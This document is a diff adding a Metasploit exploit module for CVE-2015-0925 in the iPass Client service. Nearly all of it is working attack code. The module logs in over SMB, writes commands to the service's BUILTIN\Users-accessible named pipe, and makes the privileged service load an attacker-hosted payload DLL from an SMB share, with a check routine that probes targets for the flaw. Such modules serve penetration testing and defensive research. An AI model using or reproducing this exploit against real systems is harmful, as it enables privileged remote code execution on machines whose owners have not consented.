@@ -1,0 +1,114 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::SMB::Client::Authenticated
+  include Msf::Exploit::Remote::SMB::Server::Share
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'IPass Control Pipe Remote Command Execution',
+      'Description'    => %q{
+        This module exploits a vulnerability in the IPass Client service. This service provides a
+        named pipe which can be accessed by the user group BUILTIN\Users. This pipe can be abused
+        to force the service to load a DLL from a SMB share.
+      },
+      'Author'         =>
+        [
+          'Matthias Kaiser', # Vulnerability discovery
+          'h0ng10 <info[at]mogwaisecurity.de>', # Metasploit Module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2015-0925' ],
+          [ 'OSVDB', '117423' ],
+          [ 'BID', '72265' ],
+          [ 'URL', 'http://codewhitesec.blogspot.de/2015/02/how-i-could-ipass-your-client-security.html' ],
+        ],
+      'DefaultOptions'  =>
+        {
+          'EXITFUNC' => 'process',
+        },
+      'Payload'         =>
+        {
+          'Space'       => 2048,
+          'DisableNops' => true
+        },
+      'Platform'        => 'win',
+      'Targets'         =>
+        [
+          [ 'Windows x32', { 'Arch' => ARCH_X86 } ],
+          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
+        ],
+      'Privileged'      => true,
+      'DisclosureDate'  => 'Jan 21 2015',
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 15])
+      ], self.class)
+
+    deregister_options('FILE_CONTENTS', 'FILE_NAME', 'SHARE', 'FOLDER_NAME')
+  end
+
+  def check
+    echo_value = rand_text_alphanumeric(rand(10) + 10)
+
+    begin
+      response = send_command("System.Echo #{echo_value}")
+      if response =~ Regexp.new(echo_value)
+        return Exploit::CheckCode::Vulnerable
+      else
+        return Exploit::CheckCode::Unknown
+      end
+    rescue Rex::ConnectionError => e
+      vprint_error("Connection failed: #{e.class}: #{e}")
+      return Msf::Exploit::CheckCode::Unknown
+    rescue Rex::Proto::SMB::Exceptions::LoginError => e
+      vprint_error('Connection reset during login')
+      return Msf::Exploit::CheckCode::Unknown
+    end
+  end
+
+  def setup
+    super
+    self.file_name = "#{Rex::Text.rand_text_alpha(7)}.dll"
+    self.share = Rex::Text.rand_text_alpha(5)
+  end
+
+  def primer
+    self.file_contents = generate_payload_dll
+    print_status("File available on #{unc}...")
+    send_command("iPass.SWUpdateAssist.RegisterCOM #{unc}")
+  end
+
+  def send_command(command)
+    # The connection is closed after each command, so we have to reopen it
+    connect
+    smb_login
+    pipe = simple.create_pipe('\\IPEFSYSPCPIPE')
+    pipe.write(Rex::Text.to_unicode(command))
+    response = Rex::Text.to_ascii(pipe.read)
+
+    response
+  end
+
+
+  def exploit
+    begin
+      Timeout.timeout(datastore['SMB_DELAY']) { super }
+    rescue Timeout::Error
+      # do nothing... just finish exploit and stop smb server...
+    end
+  end
+
+end
